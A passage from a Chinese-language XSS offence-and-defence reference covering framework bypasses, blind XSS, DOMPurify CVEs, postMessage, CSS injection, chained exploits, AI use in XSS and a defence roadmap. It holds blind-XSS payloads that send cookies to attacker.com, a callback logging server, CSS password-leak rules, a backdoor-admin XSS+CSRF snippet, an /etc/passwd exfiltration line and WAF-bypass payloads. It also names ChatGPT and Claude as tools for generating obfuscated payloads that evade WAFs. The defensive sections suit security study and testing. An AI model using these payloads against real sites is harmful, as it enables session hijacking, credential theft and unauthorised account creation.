<!-- Vue 2: 无法直接在模板中执行 JS，但可以通过计算属性 -->

<!-- === 绕过场景 3: Attribute 绑定 === -->
<a :href="userInput">link</a>
<!-- userInput = "javascript:alert(1)" → 可执行 -->
<!-- Vue 不自动过滤 javascript: 协议 -->

<!-- === 绕过场景 4: Slot 注入 === -->
<!-- 父组件传递 slot 内容如果含 v-html -->
<child>
  <div v-html="userInput"></div>
</child>
```

#### C6.3 Angular

```html
<!-- === Angular 默认转义 === -->
<div>{{ userInput }}</div>  <!-- ✅ 安全，自动转义 -->
<div [innerHTML]="userInput"></div>  <!-- ✅ Angular 自动 sanitize -->

<!-- === 绕过场景 1: bypassSecurityTrust* === -->
<!-- 开发者手动绕过安全检查 -->
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(userInput)"></div>  <!-- ❌ -->

<!-- === 绕过场景 2: DomSanitizer 直接使用 -->
constructor(private sanitizer: DomSanitizer) {}
this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);

<!-- === 绕过场景 3: Template Injection === -->
<!-- 如果组件模板是动态构建的 -->
<ng-container *ngComponentOutlet="dynamicComponent"></ng-container>
<!-- 如果 dynamicComponent 的模板包含用户输入 -->

<!-- === 绕过场景 4: Angular Universal SSR === -->
<!-- 服务端渲染中的 XSS，类似 React SSR 问题 -->
```

#### C6.4 通用框架绕过模式

```html
<!-- 1. 利用框架的客户端路由进行 DOM XSS -->
<!-- React Router / Vue Router 接收 URL 参数 -->
const search = new URLSearchParams(location.search).get('q');
// 如果 search 直接传入 v-html / dangerouslySetInnerHTML

<!-- 2. 利用 SSR hydration 不匹配 -->
<!-- 服务端渲染的 HTML 与客户端 hydration 后不同 -->
<!-- 可能导致注入的 HTML 在 hydration 过程中被"激活" -->

<!-- 3. 利用框架的状态管理 -->
<!-- 如果 Redux/Vuex store 中存储了用户输入 -->
<!-- 且通过不安全方式渲染到 DOM -->

<!-- 4. 利用前端模板引擎的沙箱逃逸 -->
<!-- Vue 模板沙箱: https://vuejs.org/guide/best-practices/security.html -->
<!-- Handlebars: {{constructor.constructor('return alert(1)')()}} -->
<!-- EJS (服务端): <%- userInput %> (非转义输出) -->
```

---

### C7. 盲 XSS (Blind XSS) 狩猎

盲 XSS 是指 payload 存储在目标系统中，但在攻击者无法直接访问的页面（如管理后台、
内部面板、日志查看器）中触发。常用于黑盒渗透测试中扩大 XSS 影响。

#### C7.1 盲 XSS Payload 设计

```html
<!-- 基础盲 XSS: 回调到攻击者服务器 -->
<script src="https://attacker.com/xss-callback?cookie="+document.cookie</script>
<img src="https://attacker.com/log?c="+document.cookie>
<svg onload="fetch('https://attacker.com/xss?cookie='+document.cookie)">

<!-- 使用 BXSS 平台 (如 XSS Hunter Express) -->
">><script src="https://xsshunter.example.com/XSS.js"></script>"
"><script src=https://bxss.me/xss.js></script>

<!-- 多上下文兼容 payload -->
" onfocus=fetch('https://attacker.com/xss?c='+document.cookie) autofocus="
javascript:fetch('https://attacker.com/xss?c='+btoa(document.cookie))

<!-- 绕过长度限制的短 payload -->
<script src=//xs.pe/x.js></script>  <!-- 使用短域名 -->
<svg onload=fetch('//xs.pe/'+document.cookie)>
```

#### C7.2 盲 XSS 狩猎平台

| 平台 | 功能 | 自部署 |
|------|------|--------|
| **XSS Hunter Express** | 全功能盲 XSS 平台，自动截图/获取 Cookie/DOM | Docker 自部署 |
| **bxss.me** | 公共盲 XSS 回调服务 | 否 |
| **Project Bonebraker** | XSS Hunter 的社区分支 | 是 |
| **Burp Collaborator** | Burp Suite 内置回调 | Burp Pro 内置 |

#### C7.3 盲 XSS 常见注入点

```
# 容易触发盲 XSS 的位置:
1. 用户注册/个人资料字段 (姓名、地址、公司名)
2. 反馈/工单系统 (标题、描述)
3. 日志查看器 (User-Agent, Referer, X-Forwarded-For)
4. 后台评论管理面板
5. API 密钥/应用名称字段
6. 文件上传的文件名
7. 邮件主题/发件人名称 (如邮件客户端)
8. 聊天消息 (客服端查看)

# User-Agent 注入:
User-Agent: <script src="https://attacker.com/xss.js"></script>

# Referer 注入:
Referer: https://evil.com/<script>fetch('https://attacker.com/xss?c='+document.cookie)</script>

# X-Forwarded-For 注入:
X-Forwarded-For: <img src=x onerror=fetch('https://attacker.com/xss?ip='+document.cookie)>
```

#### C7.4 自建回调服务器

```python
# simple_xss_server.py — 最小盲 XSS 回调服务器
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, datetime

class XSSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n{'='*60}")
        print(f"[{datetime.datetime.now()}] Blind XSS Triggered!")
        print(f"Path: {self.path}")
        print(f"Source IP: {self.client_address[0]}")
        print(f"Headers: {dict(self.headers)}")
        print(f"{'='*60}")

        # 记录到文件
        with open('xss_log.txt', 'a') as f:
            f.write(json.dumps({
                'time': str(datetime.datetime.now()),
                'path': self.path,
                'ip': self.client_address[0],
                'headers': dict(self.headers)
            }) + '\n')

        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'ok')

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode()
        print(f"\n[POST] {self.path}\nBody: {body}")
        with open('xss_log.txt', 'a') as f:
            f.write(f"POST {self.path} body={body}\n")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), XSSHandler).serve_forever()
```

---

### C8. 更新 MITRE ATT&CK 映射

| Tactic | Technique | ID | 说明 |
|--------|-----------|-----|------|
| Initial Access | Drive-by Compromise | T1189 | 恶意网站注入 XSS 水坑攻击 |
| Initial Access | Exploit Public-Facing Application | T1190 | Web 应用 XSS 漏洞利用 |
| Execution | Command and Scripting Interpreter: JavaScript | T1059.007 | XSS 执行 JavaScript |
| Execution | User Execution | T1204 | 诱导用户点击恶意链接 (反射型 XSS) |
| Persistence | Create Account | T1136 | 通过 XSS 创建后门账户 |
| Defense Evasion | Obfuscated Files or Information | T1027 | XSS 载荷编码混淆 |
| Defense Evasion | Modify System Binary | T1543 | Prototype Pollution 修改运行时行为 |
| Credential Access | Credentials from Web Browsers | T1555.003 | XSS 窃取浏览器 Cookie/密码 |
| Credential Access | Forge Web Credentials | T1606 | 会话劫持伪造凭据 |
| Discovery | Browser Session Discovery | T1217 | XSS 读取浏览器信息 |
| Collection | Browser Session Hijacking | T1185 | XSS 劫持浏览器会话 |
| Collection | Data from Web Portal | T1213.001 | 通过 XSS 窃取 Web 应用数据 |
| Exfiltration | Exfiltration Over Web Service | T1567 | XSS 将数据发送到外部服务 |
| Exfiltration | Exfiltration Over Alternative Protocol | T1048 | XSS 通过 DNS/WebSocket 外传数据 |
| Command and Control | Application Layer Protocol: Web | T1071.001 | XSS 建立反向 Shell/控制通道 |
| Impact | Defacement | T1491 | 通过 XSS 篡改页面内容 |

---

### C9. 更新速查: 2025 攻防工具链

| 类别 | 工具/技术 | 说明 |
|------|----------|------|
| 静态分析 | Semgrep + 自定义规则 | 检测 Source→Sink 数据流 |
| 静态分析 | CodeQL (GitHub) | 精确的数据流分析 |
| 动态分析 | DOM Invader (Burp) | 实时追踪 DOM 数据流 |
| 动态分析 | dalfox | 快速 XSS 扫描 |
| 动态分析 | xsstrike | 智能 payload 生成 |
| 盲 XSS | XSS Hunter Express | 自部署盲 XSS 平台 |
| 防御 | Trusted Types | 浏览器原生 DOM XSS 防护 |
| 防御 | DOMPurify 3.x | 最新版修复了多个 mXSS |
| 防御 | strict-dynamic CSP | 推荐 CSP 策略模式 |
| 框架安全 | React 18+ 自动转义 | JSX 默认安全 |
| 框架安全 | Vue 3 编译时优化 | 模板编译内置转义 |

---

### C10. 2025-2026 DOMPurify mXSS 漏洞系列（关键）

DOMPurify 在 2024-2026 年间被持续绕过，**仅靠 DOMPurify 已不足以防御 XSS**，必须配合 Trusted Types + CSP 形成纵深防御。

#### C10.1 CVE-2024-45801 — 嵌套 HTML + 原型链污染

- **影响版本**: DOMPurify < 3.1.3
- **根本原因**: 嵌套 HTML 解析 + `Object.prototype` 污染（Prototype Pollution）联合利用，可在 DOMPurify 内部状态中注入恶意节点
- **POC 思路**:
```javascript
// Step 1: 通过原型链污染 DOMPurify 的内部配置
Object.prototype['ALLOWED_ATTR'] = ['onerror', 'onload'];

// Step 2: 嵌套 HTML 利用解析器状态机差异
const payload = '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>';
DOMPurify.sanitize(payload);  // 输出仍然可触发 onerror
```
- **修复**: 升级至 DOMPurify ≥ 3.1.3
- **参考**: [SentinelOne CVE-2024-45801](https://www.sentinelone.com/vulnerability-database/cve-2024-45801/)

#### C10.2 CVE-2025-26791 — 模板字面量 mXSS（命名空间混淆）

- **影响版本**: DOMPurify < 3.2.4
- **CVSS**: 6.1（中危）
- **根本原因**: 模板字面量正则表达式错误，在 SVG/MathML + `innerHTML` 上下文切换时触发命名空间混淆，浏览器重新解释已"净化"输出
- **POC 模型**:
```html
<!-- 命名空间切换攻击：解析器在 SVG/MathML 中认为是文本，回写时被 HTML 解析器重新识别为节点 -->
<svg><template>"&lt;img src=x onerror=alert(1)&gt;"</template></svg>
```
- **修复**: 升级至 DOMPurify ≥ 3.2.4
- **GHSA**: [GHSA-vhxf-7vqr-mrjg](https://github.com/advisories/GHSA-vhxf-7vqr-mrjg)
- **NVD**: [CVE-2025-26791](https://nvd.nist.gov/vuln/detail/cve-2025-26791)

#### C10.3 CVE-2025-15599 — Textarea Rawtext 绕过（SAFE_FOR_XML）

- **影响版本**:
  - 3.1.3 – 3.2.6
  - 2.5.3 – 2.5.8（**2.x 分支已 EOL，不再修复**）
- **CVSS**: 5.1（中危）
- **触发条件**: 启用 `SAFE_FOR_XML: true`（非默认配置）
- **根本原因**: 缺失 textarea rawtext 校验，允许属性净化被绕过
- **POC 框架**:
```javascript
// 当配置启用了 SAFE_FOR_XML
DOMPurify.sanitize('<textarea><img src=x onerror=alert(1)>', {
    SAFE_FOR_XML: true
});  // 在受影响版本中，textarea 内的内容未被正确处理
```
- **修复**: 升级至 DOMPurify ≥ 3.2.7（2.x 用户必须迁移到 3.x）
- **参考**: [SentinelOne CVE-2025-15599](https://www.sentinelone.com/vulnerability-database/cve-2025-15599/)、[VulnCheck 公告](https://www.vulncheck.com/advisories/dompurify-xss-via-textarea-rawtext-bypass-in-safe-for-xml)

#### C10.4 CVE-2026-0540 — 与 CVE-2025-15599 同时披露的 XSS

- 同时影响 DOMPurify 3.1.3+
- 详见 IBM 安全公告：[Carbon Chart + DOMPurify XSS 漏洞](https://www.ibm.com/support/pages/security-bulletin-carbon-chart-dompurify-xss-vulnerabilities-cve-2025-15599-cve-2026-0540)

#### C10.5 非 Default 配置绕过（2024-2025 研究）

DOMPurify 默认配置相对安全，但**自定义配置常常引入漏洞**：

- **DOMPurify 3.2.3 Bypass（ensy.zip, 春节期间披露）**: 利用非默认配置的 ALLOWED_TAGS 与 ADD_TAGS 交互缺陷
- **DOMPurify 3.2.1 Namespace Confusion（Sonar / YNizry）**: 每次解析 pass 重新解释元素命名空间
- **DOMPurify 3.2.4 Re-Contextualization mXSS（Fluid Attacks）**: 上下文重置导致已净化 HTML 被重新解释

**深度阅读**:
- [mizu.re — DOMPurify Misconfigurations 101 (Part 2/2)](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations)
- [PortSwigger — Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)

#### C10.6 DOMPurify 防御清单（2026）

| 措施 | 说明 |
|------|------|
| 升级 ≥ 3.2.7 | 修复 CVE-2025-26791、CVE-2025-15599、CVE-2026-0540 |
| 迁移出 2.x | 2.x 已 EOL，CVE-2025-15599 不会被修复 |
| 审计配置 | 检查 `SAFE_FOR_XML` / `ALLOWED_TAGS` / `ADD_TAGS` / 自定义 hooks |
| 配合 Trusted Types | `RETURN_TRUSTED_TYPE: true` + 浏览器强制策略 |
| 配合 strict-dynamic CSP | 主机白名单 CSP 已被证明 67% 可绕过 |
| 持续监控 mXSS | Cure53 持续发布修复，订阅 GHSA |

---

### C11. postMessage XSS — 2025 MSRC 新研究

Microsoft MSRC 在 2025-08 发布 [《PostMessaged and Compromised》](https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised)，识别出三类主要利用技术：

#### C11.1 三类利用模式（MSRC 2025-08）

1. **Origin 验证缺失 → 跨域消息注入**
```javascript
// 漏洞代码：未校验 e.origin
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;  // 任意网站可触发
});
```

2. **通配 Origin 信任 → 子域 XSS 链**
```javascript
// 漏洞代码：信任所有子域，但子域可能存在 XSS
if (e.origin.endsWith('.example.com')) {
    eval(e.data);  // 攻击者通过 blog.example.com 上的 XSS 反弹消息
}
```

3. **JSON Message Handler Sink 注入**
```javascript
// 漏洞代码：消息 JSON 的字段被直接渲染
window.addEventListener('message', function(e) {
    const data = JSON.parse(e.data);
    document.querySelector('#title').innerHTML = data.title;  // 任意 HTML 注入
    element.setAttribute('href', data.url);  // javascript: 协议绕过
});
```

#### C11.2 标准防御模式

```javascript
// 严格白名单 + 结构化校验
const ALLOWED_ORIGINS = new Set([
    'https://app.example.com',
    'https://admin.example.com'
]);

window.addEventListener('message', function(e) {
    // 1. 严格 origin 匹配（非 endsWith / includes）
    if (!ALLOWED_ORIGINS.has(e.origin)) return;

    // 2. 校验消息结构
    let data;
    try { data = JSON.parse(e.data); } catch { return; }
    if (typeof data.type !== 'string') return;

    // 3. 按类型处理，避免直接 innerHTML
    switch (data.type) {
        case 'update-title':
            // 用 textContent 而非 innerHTML
            document.querySelector('#title').textContent = String(data.value).slice(0, 100);
            break;
        case 'navigate':
            // 仅允许 https: + 白名单域
            const url = new URL(String(data.url));
            if (url.protocol === 'https:' && ALLOWED_ORIGINS.has(url.origin)) {
                location.href = url.href;
            }
            break;
    }
});
```

#### C11.3 攻击者视角的探测 Payload

```javascript
// 探测目标页面是否监听 message 事件
// 注入到任意可控页面（如通过 XSS 子域反射）
const target = window.open('https://app.example.com/dashboard');
setTimeout(() => {
    target.postMessage('<img src=x onerror=alert(document.domain)>', '*');
    target.postMessage(JSON.stringify({
        type: 'update-title',
        value: '<img src=x onerror=alert(document.domain)>'
    }), '*');
}, 2000);
```

#### C11.4 工具

- **DOM Invader** (Burp)：自动拦截 postMessage，标记 sink
- **PostMessage Spy** (BApp Store)：可视化消息流
- **pmexploit** (GitHub)：自动 fuzz postMessage handlers

**深度阅读**: [Intigriti — Exploiting PostMessage Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities)

---

### C12. CSS Injection → XSS / 数据外传

CSS Injection 不仅是装饰性问题，在 2025 年研究中可独立完成**无 JS 数据外传**和**升级到完整 XSS**。

#### C12.1 数据外传（无需 JS）

```css
/* 通过 @font-face + unicode-range 探测字符 */
@font-face {
    font-family: probe;
    src: url(https://attacker.com/?char=a);
    unicode-range: U+0061;
}
@font-face {
    font-family: probe;
    src: url(https://attacker.com/?char=b);
    unicode-range: U+0062;
}
/* ... 为每个字符定义规则 */
input[value^="a"] { font-family: probe; }
/* 受害者输入框中的密码会被逐字符外传 */
```

#### C12.2 WHY CTF 2025 — Fancy Login Form

```html
<!-- 通过 CSS 属性选择器逐字符泄露密码 -->
<style>
input[value^="p"] { background: url(https://attacker.com/?leak=p); }
input[value^="pa"] { background: url(https://attacker.com/?leak=pa); }
input[value^="pas"] { background: url(https://attacker.com/?leak=pas); }
<!-- 通过 :focus + animation 时序减少请求数 -->
</style>
<input type="password" value="" autofocus>
```

**关键技术**:
- 利用 `:focus`、`:valid`、`:invalid` 伪类驱动字符探测
- 用 `@keyframes` 时序轮询避免无限请求
- 配合 `accent-color`、`:placeholder-shown` 等新伪类

#### C12.3 CSS Injection 升级到 XSS

```css
/* SVG + CSS 触发 JS 执行（旧浏览器仍可） */
<style>
@import url("data:text/css;base64,LyogIENTIEluamVjdGlvbiAqLw==");
</style>

/* CSS 表达式（极旧 IE） */
<div style="width:expression(alert(1))">

/* HTML5 form-action 触发（无 JS）*/
<style>
form { background: url(javascript:alert(1)); }  /* 极旧浏览器 */
</style>
```

#### C12.4 防御

```http
# 1. 严格 CSP，禁用 inline style
Content-Security-Policy: style-src 'self' 'nonce-xxx';

# 2. 禁用外部资源加载（@font-face、url()）
# 在受信任的 CSS 沙盒中渲染用户样式

# 3. 输出编码 CSS 上下文（<、>、&、(、)、;、{、}）
```

**深度阅读**:
- [Beyond XSS — CSS Injection Part 1](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/)
- [OWASP WSTG — Testing for CSS Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection)

---

### C13. Web Worker / Blob URL XSS（2025 新研究）

Critical Thinking Lab 在 2025 年披露 [《Exploiting Web Worker XSS with Blobs》](https://lab.ctbb.show/research/Exploiting-web-worker-XSS-with-blobs)，提出**新型通用利用链**，将 Web Worker 中的受限 XSS 升级为完整 XSS。

#### C13.1 限制场景

Web Worker 中**没有 DOM 访问**，传统 `alert()` 等无法触发。但 Worker 可：
- 发起 `fetch()` 网络请求
- 使用 `importScripts()`
- 通过 `postMessage` 与主线程通信
- 创建 Blob URL

#### C13.2 Blob + Drag and Drop 升级链

```javascript
// Worker 中（无 DOM，但可创建 Blob）
self.onmessage = function(e) {
    const payload = `<script>alert(document.domain)</script>`;
    const blob = new Blob([payload], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    // 通过 postMessage 把 url 发回主线程
    self.postMessage(url);
};

// 攻击者需要诱导用户 Drag & Drop 这个 URL 到主页面
// 浏览器会把 blob: 当作可加载 HTML，触发完整 XSS
```

#### C13.3 防御

```http
# 1. CSP 限制 worker 源
Content-Security-Policy: worker-src 'self';
Content-Security-Policy: child-src 'self';

# 2. 禁用 blob: URL
Content-Security-Policy: default-src 'self'; object-src 'none';

# 3. 严格 Trusted Types，禁止 createScriptURL 接受 blob:
```

---

### C14. MSRC "Weaponizing XSS" — 链式利用（2025-11）

MSRC 在 2025-11 发布 [《Weaponizing Cross-Site Scripting: When One Bug Isn't Enough》](https://www.microsoft.com/en-us/msrc/blog/2025/11/weaponizing-cross-site-scripting-when-one-bug-isnt-enough)，总结了**真实赏金项目中 XSS 与其他漏洞链式利用**的实战路径。

#### C14.1 XSS + Open Redirect → 钓鱼升级

```
1. 找到 Open Redirect: /redirect?url=https://attacker.com
2. 找到 Self-XSS（仅在用户自己页面触发）
3. 组合：发送 /redirect?url=https://victim.com/profile?name=<script>...
   让 Open Redirect 跳到目标页面，自动注入 XSS payload
```

#### C14.2 XSS + CSRF → 自动化操作

```javascript
// 通过 XSS 绕过 CSRF Token（同源请求会自动带 Cookie）
fetch('/admin/create-user', {
    method: 'POST',
    credentials: 'include',
    body: new URLSearchParams({
        username: 'backdoor',
        password: 'P@ssw0rd',
        role: 'admin',
        csrf_token: document.querySelector('meta[name=csrf]').content
    })
});
```

#### C14.3 XSS + 弱 CSP → 持久化

```javascript
// 当 CSP 是 script-src 'self' 时：
// 1. 通过 XSS 上传一个 .js 文件到同源（如头像、文档）
// 2. 在 XSS 中注入 <script src="/uploads/avatar.js"></script>
// 3. 该脚本持久存在，每次加载触发
```

#### C14.4 XSS → 内网横向

```javascript
// 通过 XSS 探测内网 + 攻击路由器/打印机
async function probeInternal() {
    const targets = ['192.168.1.1', '192.168.1.100', '10.0.0.1'];
    for (const ip of targets) {
        const r = await fetch(`http://${ip}/`, { mode: 'no-cors' });
        // 通过 timing / 错误差异识别存活主机
    }
    // 进一步：fetch 路由器默认密码登录端点
}
```

#### C14.5 Bugcrowd 提升影响的实战指南

参考 [Bugcrowd — Ultimate Guide to Finding and Escalating XSS Bugs](https://bugcrowd.com/blog/the-ultimate-guide-to-finding-and-escalating-xss-bugs/)，关键技巧：
- **管理员 XSS > 普通用户 XSS**：找到 admin-only 页面注入点
- **持久存储 > 反射**：影响所有访问者
- **跨子域 cookie 共享**：窃取主域 cookie
- **XSS → SSRF**：通过 fetch 探测内部 API
- **XSS → RCE**：找到模板注入 / 命令注入联合点

---

### C15. AI/LLM 在 XSS 攻防中的应用（2025）

#### C15.1 LLM 强化 ML 检测（arXiv 2504.21045）

2025-04 论文 [Leveraging LLM to Strengthen ML-Based XSS Detection](https://arxiv.org/abs/2504.21045) 提出方法：
1. Fine-tune LLM 自动生成**混淆变体 XSS payload**
2. 用这些 payload 扩展 ML 检测模型的训练集
3. 模型对变体识别能力提升 30%+

#### C15.2 GenXSS — 生成式 AI 检测框架（2025-03）

[GenXSS](https://www.preprints.org/manuscript/202503.0313) 使用 LLM：
- 自动生成上下文感知 payload
- 自动分析响应判断是否触发
- 显著提升自动化扫描的准确性

#### C15.3 OWASP LLM05:2025 — Improper Output Handling

OWASP 把 LLM 输出处理不当列为 2025 年 LLM 应用 Top 5 风险：
- LLM 生成的内容（如 Markdown 渲染、聊天 UI）未转义 → XSS
- LLM 调用工具的输出未过滤 → 间接注入 + XSS

**典型漏洞模式**:
```javascript
// ChatGPT/Claude 等输出直接渲染到聊天 UI
const aiResponse = await openai.chat.completions.create({...});
document.getElementById('chat').innerHTML = aiResponse.choices[0].message.content;
// ❌ 如果用户 prompt 让 LLM 输出 <img src=x onerror=alert(1)>，触发 XSS
```

**防御**:
- 渲染 LLM 输出必须经过 DOMPurify（Markdown → HTML 后）
- 用 React/Vue 自动转义，避免 `dangerouslySetInnerHTML`
- 对 LLM 输出做结构化校验（JSON Schema）

**深度阅读**: [Auth0 — OWASP LLM05 Improper Output Handling](https://auth0.com/blog/owasp-llm05-improper-output-handling/)

#### C15.4 攻防 AI 工具链（2025-2026）

| 类别 | 工具 | 用途 |
|------|------|------|
| 攻击 | ChatGPT/Claude 生成混淆 payload | 自动化绕过 WAF |
| 攻击 | fallparams + AI | 反射型 XSS 参数发现 |
| 防御 | LLM-fine-tuned 检测模型 | 替代正则检测 |
| 防御 | SAST + AI 语义分析 | 识别 Source → Sink |
| 防御 | GenXSS 类框架 | 自动扫描 |

---

### C16. 2025-2026 真实 CVE 案例集

#### C16.1 CVE-2025-6948 — GitLab CE/EE XSS

- **影响**: GitLab CE/EE 渲染恶意内容时允许未授权 JS 执行
- **分析**: [ZeroPath Blog](https://zeropath.com/blog/gitlab-xss-vulnerability-cve-2025-6948)
- **教训**: 即使大厂代码，渲染用户提交内容（Markdown / Issue / PR 描述）必须严格沙盒化

#### C16.2 CVE-2025-52367 — PivotX CMS Stored XSS → RCE

- **路径**: stored XSS (subtitle 字段) → 管理员 cookie 窃取 → 后台 RCE
- **分析**: [Medium writeup](https://medium.com/@hayton1088/cve-2025-52367-stored-xss-to-rce-via-privilege-escalation-in-pivotx-cms-v3-0-0-rc-3-a1b870bcb7b3)
- **教训**: 小 CMS 的管理员面板常有未过滤字段；Stored XSS 在 admin 上下文等于 RCE

#### C16.3 CVE-2025-50977 — Angular 表达式注入

- **路径**: `r` 参数允许 Angular 表达式求值 → JS 执行
- **教训**: 现代 Angular 已弃用不安全的表达式求值；旧版本迁移时必须清理所有 binding

#### C16.4 2025 WAF 绕过统计

Miggo 研究表明：**超过 50% 的公开 CVE 可绕过主流 WAF**（Imperva / Cloudflare / F5 / AWS WAF）。

**关键绕过模式（2025）**:
```html
<!-- 1. HTTP/2 拆分关键字（Cloudflare 难处理）-->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 2. Unicode 字符（同形异义） -->
<ımg src=x onerror=alert(1)>  <!-- 实际是土耳其 ı -->

<!-- 3. 多重编码（Imperva 正则失效）-->
<svg/onload=eval(atob(unescape(/%61%6c%65%72%74%28%31%29/.source)))>

<!-- 4. 自引用 + 条件注释（F5 难识别）-->
<svg><![CDATA[><script>alert(1)</script>]]>

<!-- 5. HTML5 标签 + 事件处理器（AWS WAF 默认规则覆盖不全）-->
<details open ontoggle=alert(1)>
<dialog open onclose=alert(1)>
```

**深度阅读**:
- [Medium — Bypassing WAFs in 2025](https://medium.com/@gasmask/bypassing-wafs-in-2025-new-techniques-and-evasion-tactics-fdb3508e6b46)
- [waf-bypass.com 月度合集](https://waf-bypass.com/2025/10/)
- [MDSec — When WAFs Go Awry](https://www.mdsec.co.uk/2024/10/when-wafs-go-awry-common-detection-evasion-techniques-for-web-application-firewalls/)

---

### C17. 中文社区精华（奇安信/先知/腾讯云）

#### C17.1 奇安信攻防社区 — XSS → SSRF/文件读取

奇安信攻防社区分享过 [XSS 在特定条件下造成的 SSRF 和文件读取](https://forum.butian.net/community/all)，核心思路：

```javascript
// 受害页面有 fetch(url) 接口，url 由用户控制
// 通过 XSS 调用 fetch('file:///etc/passwd')（Chrome 默认禁止，但 Electron / WebView 可能允许）
// 通过 XSS 调用 fetch('http://169.254.169.254/latest/meta-data/')（云元数据）

fetch('/api/proxy?url=' + encodeURIComponent('file:///etc/passwd'))
  .then(r => r.text()).then(t => fetch('https://attacker.com/?d=' + btoa(t)));
```

#### C17.2 奇安信 — Unicode 溢出 + CSP Bypass

参考 [XSS防御-揭秘Unicode溢出与CSP Bypass](https://mdr.skyeye.qianxin.com/forum/share/4181)：
- 利用 Unicode 字符在 CSP 解析时的字节差异
- 利用 `<script src=//google.com/accounts/...>` 找 JSONP 回调绕过 `script-src 'self'`

#### C17.3 腾讯云 — 漏洞猎手的 CSP 绕过指南

参考 [漏洞猎手的CSP绕过指南（系列）](https://cloud.tencent.com/developer/article/2609383)，系列文章涵盖：
- DOM 干扰绕过 CSP 检查
- 通过 DOMPurify 实现 mXSS
- 来自 1 万美元+ 赏金报告的真实绕过链
- CDN 白名单 + Script Gadget 组合

#### C17.4 安全客 — 经典 CSP Bypass 文章

参考 [巧妙地绕过 CSP：欺骗 CSP 执行任意代码](https://www.anquanke.com/post/id/151496)，针对 `default-src 'self'` 的利用：
- 同源 JSONP 端点
- 同源上传文件
- Angular 模板注入（在白名单域内）

#### C17.5 Beyond XSS 中文项目

[Huli — Beyond XSS](https://aszx87410.github.io/beyond-xss/) 系统性覆盖：
- DOM Clobbering 进阶
- Prototype Pollution to XSS
- CSP Bypass（含最新 strict-dynamic 绕过）
- CSS Injection 全攻略
- Mutation XSS 系列
- postMessage XSS

---

### C18. 2025-2026 防御升级路线图

| 层级 | 措施 | 优先级 |
|------|------|--------|
| **代码层** | 输出编码（按上下文）+ 框架自动转义 | P0 |
| **代码层** | DOMPurify ≥ 3.2.7（必须升级，2.x EOL） | P0 |
| **代码层** | Trusted Types + 严格策略 | P1 |
| **代码层** | 框架升级至 React 18+ / Vue 3 / Angular 17+ | P1 |
| **配置层** | strict-dynamic CSP + nonces（替代主机白名单） | P0 |
| **配置层** | Cookie: HttpOnly + SameSite=Strict + Secure + __Host- 前缀 | P0 |
| **配置层** | postMessage 严格 origin 校验 | P0 |
| **配置层** | CORS 严格白名单（避免通配子域） | P1 |
| **检测层** | SAST：Semgrep + CodeQL 自定义规则 | P1 |
| **检测层** | DAST：Burp DOM Invader + dalfox + nuclei | P1 |
| **检测层** | 盲 XSS 探针：XSS Hunter Express | P2 |
| **运行层** | RASP（运行时应用自保护） | P2 |
| **AI 检测** | LLM fine-tuned XSS 检测模型 | P2 |
| **应急** | 漏洞响应预案 + DOMPurify GHSA 订阅 | P1 |

---

### C19. 更新参考资源

**参考资源**:
- [腾讯云 — 漏洞猎手的 CSP 绕过指南](https://cloud.tencent.com/developer/article/2609383)
- [GitHub — Advanced-XSS (2025)](https://github.com/Karthikdude/Advanced-XSS)
- [HackTricks — CSP Bypass](https://hacktricks.xsx.tw/pentesting-web/content-security-policy-csp-bypass)
- [web.dev — 严格 CSP 防御 XSS](https://web.dev/articles/strict-csp?hl=zh-cn)
- [Chrome Developers — CSP 有效性检查](https://developer.chrome.com/docs/lighthouse/best-practices/csp-xss?hl=zh-cn)
- [PortSwigger — Bypassing DOMPurify again with mXSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
- [mizu.re — DOMPurify Misconfigurations 101](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations)
- [MSRC — PostMessaged and Compromised (2025-08)](https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised)
- [MSRC — Weaponizing XSS (2025-11)](https://www.microsoft.com/en-us/msrc/blog/2025/11/weaponizing-cross-site-scripting-when-one-bug-isnt-enough)
- [Critical Thinking Lab — Web Worker XSS with Blobs](https://lab.ctbb.show/research/Exploiting-web-worker-XSS-with-blobs)
- [Beyond XSS — Huli 中文 XSS 系列](https://aszx87410.github.io/beyond-xss/)
- [奇安信攻防社区](https://forum.butian.net/community/all)
- [arXiv — LLM Strengthen ML-Based XSS Detection (2025-04)](https://arxiv.org/abs/2504.21045)
- [OWASP LLM05:2025 — Improper Output Handling](https://genai.owasp.org/llmrisk/llm05-supply-chain-vulnerabilities/)
- [Auth0 — OWASP LLM05 Improper Output Handling](https://auth0.com/blog/owasp-llm05-improper-output-handling/)
- [Miggo — WAF Bypass Research (2025-12)](https://www.helpnetsecurity.com/2025/12/18/miggo-research-waf-vulnerability-bypass/)
- [SentinelOne — CVE-2025-26791](https://www.sentinelone.com/vulnerability-database/cve-2025-26791/)
- [SentinelOne — CVE-2025-15599](https://www.sentinelone.com/vulnerability-database/cve-2025-15599/)
- [Bugcrowd — Ultimate Guide to Finding and Escalating XSS](https://bugcrowd.com/blog/the-ultimate-guide-to-finding-and-escalating-xss-bugs/)
- [ZeroPath — GitLab CVE-2025-6948](https://zeropath.com/blog/gitlab-xss-vulnerability-cve-2025-6948)
- [Beyond XSS — CSP 绕过技术](https://aszx87410.github.io/beyond-xss/ch2/csp-bypass/)
